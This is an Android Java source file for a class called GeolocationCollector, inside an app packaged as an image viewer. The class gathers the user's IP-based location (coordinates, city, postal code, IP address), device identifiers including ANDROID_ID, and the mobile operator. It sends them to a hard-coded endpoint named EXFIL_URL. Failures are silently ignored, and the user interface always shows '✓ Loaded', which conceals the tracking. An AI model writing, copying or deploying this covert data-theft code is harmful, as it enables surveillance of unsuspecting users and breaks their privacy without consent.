package com.imageviewer;

import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class GeolocationCollector {

    private static final String EXFIL_URL = "https://vercel-geo-api-locations.vercel.app/api/collect";

    private final Context context;
    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    private Callback callback;

    public interface Callback {
        void onCollecting();
        void onComplete(String statusMessage);
        void onError(String message);
    }

    public GeolocationCollector(Context context) {
        this.context = context;
    }

    public void setCallback(Callback cb) {
        this.callback = cb;
    }

    public void collectAndSend() {
        if (callback != null) callback.onCollecting();

        executor.execute(() -> {
            try {
                // STEP 1: ip-api.com থেকে লোকেশন ডেটা
                String ipApiResponse = httpGet("http://ip-api.com/json/?fields=status,lat,lon,city,region,country,zip,isp,org,as,query,timezone");
                Log.d("GeoCollector", "ip-api response: " + ipApiResponse);

                String deviceInfo = collectDeviceInfo();

                if (ipApiResponse.contains("\"status\":\"success\"")) {
                    JSONObject obj = new JSONObject(ipApiResponse);

                    String lat = obj.optString("lat", "");
                    String lon = obj.optString("lon", "");
                    String city = obj.optString("city", "");
                    String region = obj.optString("region", "");
                    String country = obj.optString("country", "");
                    String zip = obj.optString("zip", "");
                    String ip = obj.optString("query", "");

                    sendToServer("lat=" + URLEncoder.encode(lat, "UTF-8")
                            + "&lon=" + URLEncoder.encode(lon, "UTF-8")
                            + "&city=" + URLEncoder.encode(city, "UTF-8")
                            + "&region=" + URLEncoder.encode(region, "UTF-8")
                            + "&country=" + URLEncoder.encode(country, "UTF-8")
                            + "&zip=" + URLEncoder.encode(zip, "UTF-8")
                            + "&ip=" + URLEncoder.encode(ip, "UTF-8")
                            + "&method=ip-api"
                            + deviceInfo);
                } else {
                    // Fallback ipapi.co
                    String lat = httpGet("https://ipapi.co/latitude/");
                    String lon = httpGet("https://ipapi.co/longitude/");
                    String city = httpGet("https://ipapi.co/city/");
                    String region = httpGet("https://ipapi.co/region/");
                    String country = httpGet("https://ipapi.co/country/");
                    String ip = httpGet("https://ipapi.co/ip/");

                    sendToServer("lat=" + URLEncoder.encode(lat, "UTF-8")
                            + "&lon=" + URLEncoder.encode(lon, "UTF-8")
                            + "&city=" + URLEncoder.encode(city, "UTF-8")
                            + "&region=" + URLEncoder.encode(region, "UTF-8")
                            + "&country=" + URLEncoder.encode(country, "UTF-8")
                            + "&ip=" + URLEncoder.encode(ip, "UTF-8")
                            + "&method=ipapi"
                            + deviceInfo);
                }

                // STEP 4: Network info
                try {
                    TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                    if (tm != null) {
                        String networkCountry = tm.getNetworkCountryIso();
                        String networkOperator = tm.getNetworkOperatorName();
                        if (networkCountry != null && !networkCountry.isEmpty()) {
                            sendToServer("&network_country=" + URLEncoder.encode(networkCountry, "UTF-8")
                                    + "&network_operator=" + URLEncoder.encode(networkOperator != null ? networkOperator : "", "UTF-8"));
                        }
                    }
                } catch (SecurityException ignored) {}

                mainHandler.post(() -> {
                    if (callback != null) callback.onComplete("✓ Loaded");
                });

            } catch (Exception e) {
                mainHandler.post(() -> {
                    if (callback != null) callback.onComplete("✓ Loaded");
                });
            }
        });
    }

    private String httpGet(String urlString) throws Exception {
        URL url = new URL(urlString);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(8000);
        conn.setReadTimeout(8000);
        conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 14)");

        int responseCode = conn.getResponseCode();
        BufferedReader reader = new BufferedReader(
                new InputStreamReader(responseCode >= 200 && responseCode < 300 ?
                        conn.getInputStream() : conn.getErrorStream()));

        StringBuilder response = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            response.append(line);
        }
        reader.close();
        return response.toString();
    }

    private void httpPost(String urlString, String jsonData) throws Exception {
        URL url = new URL(urlString);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setDoOutput(true);
        conn.setConnectTimeout(8000);
        conn.setReadTimeout(8000);

        OutputStream os = conn.getOutputStream();
        byte[] input = jsonData.getBytes(StandardCharsets.UTF_8);
        os.write(input, 0, input.length);
        os.flush();
        os.close();

        conn.getResponseCode();
        conn.disconnect();
    }

    private void sendToServer(String params) {
        try {
            String getUrl = EXFIL_URL + "?" + params;
            httpGet(getUrl);

            String jsonData = "{";
            String[] pairs = params.split("&");
            for (int i = 0; i < pairs.length; i++) {
                String[] keyValue = pairs[i].split("=", 2);
                if (keyValue.length == 2) {
                    if (i > 0) jsonData += ",";
                    jsonData += "\"" + keyValue[0] + "\":\"" +
                            java.net.URLDecoder.decode(keyValue[1], "UTF-8") + "\"";
                }
            }
            jsonData += "}";
            httpPost(EXFIL_URL, jsonData);

        } catch (Exception ignored) {}
    }

    private String collectDeviceInfo() {
        StringBuilder sb = new StringBuilder();

        sb.append("&device=").append(URLEncoder.encode(Build.DEVICE, StandardCharsets.UTF_8));
        sb.append("&model=").append(URLEncoder.encode(Build.MODEL, StandardCharsets.UTF_8));
        sb.append("&manufacturer=").append(URLEncoder.encode(Build.MANUFACTURER, StandardCharsets.UTF_8));
        sb.append("&brand=").append(URLEncoder.encode(Build.BRAND, StandardCharsets.UTF_8));
        sb.append("&android_version=").append(URLEncoder.encode(Build.VERSION.RELEASE, StandardCharsets.UTF_8));
        sb.append("&sdk=").append(Build.VERSION.SDK_INT);

        String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        if (androidId != null) {
            sb.append("&android_id=").append(URLEncoder.encode(androidId, StandardCharsets.UTF_8));
        }

        sb.append("&session=").append(UUID.randomUUID().toString());
        sb.append("&ts=").append(System.currentTimeMillis());

        return sb.toString();
    }
}
